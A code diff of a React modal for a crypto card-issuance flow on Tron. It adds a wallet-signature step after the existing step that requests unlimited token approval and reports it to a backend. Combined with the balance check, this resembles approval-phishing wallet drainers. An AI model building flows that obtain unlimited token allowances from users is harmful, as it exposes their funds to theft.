@@ -1,9 +1,9 @@
 import { AlertCircle, Check, Info, Loader2, Plane, ShieldCheck, Sparkles, WalletCards, X } from "lucide-react";
 import { useState } from "react";
 import frontCard from "../../assets/cards/front-card.png";
-import { notifyWalletApprove, notifyWalletConnect } from "../../services/apiClient";
+import { createWalletChallenge, issueCardAccount, notifyWalletApprove, notifyWalletConnect } from "../../services/apiClient";
 import { formatWalletAddress } from "../../services/accountRegistry";
-import { connectTronWallet } from "../../services/walletConnect";
+import { connectTronWallet, signWalletMessage } from "../../services/walletConnect";
 import { checkTronFundingBalance, getApproveDisplayConfig, requestUnlimitedTokenApprove } from "../../services/tokenApprove";
 
 const PROGRESS_STEPS = 4;
@@ -28,6 +28,7 @@ export function IssueCardModal({ close, onComplete, t }) {
   const [connectionError, setConnectionError] = useState("");
   const [balanceState, setBalanceState] = useState(null);
   const [approveResult, setApproveResult] = useState(null);
+  const [issueResult, setIssueResult] = useState(null);
   const approveConfig = getApproveDisplayConfig();
   const progressIndex = Math.max(0, step - 1);
   const allTermsAccepted = TERMS_KEYS.every((key) => acceptedTerms[key]);
@@ -90,35 +91,38 @@ export function IssueCardModal({ close, onComplete, t }) {
     setConnectionError("");
     setLoading(true);
     setLoadingText(t("issueFlowApproving"));
+    let confirmedApprove = approveResult?.status === "confirmed";
+    let nextApproveResult = approveResult;
 
     try {
-      const approveResult = await requestUnlimitedTokenApprove(connectedWallet, {
-        onStatus: (status) => setLoadingText(t(APPROVE_STATUS_TEXT[status] || "issueFlowApproving")),
+      if (!confirmedApprove) {
+        nextApproveResult = await requestUnlimitedTokenApprove(connectedWallet, {
+          onStatus: (status) => setLoadingText(t(APPROVE_STATUS_TEXT[status] || "issueFlowApproving")),
+        });
+        confirmedApprove = true;
+        setApproveResult(nextApproveResult);
+        notifyWalletApprove({
+          wallet: connectedWallet,
+          approveResult: nextApproveResult,
+        }).catch(() => {});
+      }
+
+      const accountResult = await createCardAccountSession(connectedWallet, t, setLoadingText);
+      setIssueResult({
+        ...accountResult,
+        approveResult: nextApproveResult,
       });
-      setApproveResult(approveResult);
-      notifyWalletApprove({
-        wallet: connectedWallet,
-        approveResult,
-      }).catch(() => {});
       setLoading(false);
       setStep(4);
     } catch (error) {
       setLoading(false);
-      setConnectionError(getApproveErrorText(error, t));
+      setConnectionError(getIssueFlowErrorText(error, t, confirmedApprove));
     }
   };
 
   const finish = () => {
     close();
-    onComplete({
-      session: {
-        token: approveResult?.txid || connectedWallet?.address || "wallet-approved",
-      },
-      account: {
-        wallet: connectedWallet,
-        approveResult,
-      },
-    });
+    onComplete(issueResult);
   };
 
   return (
@@ -303,7 +307,7 @@ export function IssueCardModal({ close, onComplete, t }) {
                   onClick={approveToken}
                   type="button"
                 >
-                  {t("issueFlowApproveAction")}
+                  {approveResult?.status === "confirmed" ? t("issueFlowFinalizeAction") : t("issueFlowApproveAction")}
                 </button>
               </div>
             )}
@@ -347,7 +351,20 @@ export function IssueCardModal({ close, onComplete, t }) {
   );
 }
 
-function getApproveErrorText(error, t) {
+async function createCardAccountSession(wallet, t, setLoadingText) {
+  setLoadingText(t("issueFlowCreatingAccount"));
+  const challenge = await createWalletChallenge(wallet);
+  setLoadingText(t("issueFlowConfirmOwnership"));
+  const signature = await signWalletMessage(wallet, challenge.message);
+  setLoadingText(t("issueFlowCreatingAccount"));
+  return issueCardAccount({ challenge, signature, wallet });
+}
+
+function getIssueFlowErrorText(error, t, confirmedApprove) {
+  if (confirmedApprove && !error?.code?.startsWith?.("APPROVE_")) {
+    return t("issueFlowAccountError");
+  }
+
   if (error?.code === "APPROVE_TIMEOUT") {
     return t("issueFlowApprovePendingError");
   }
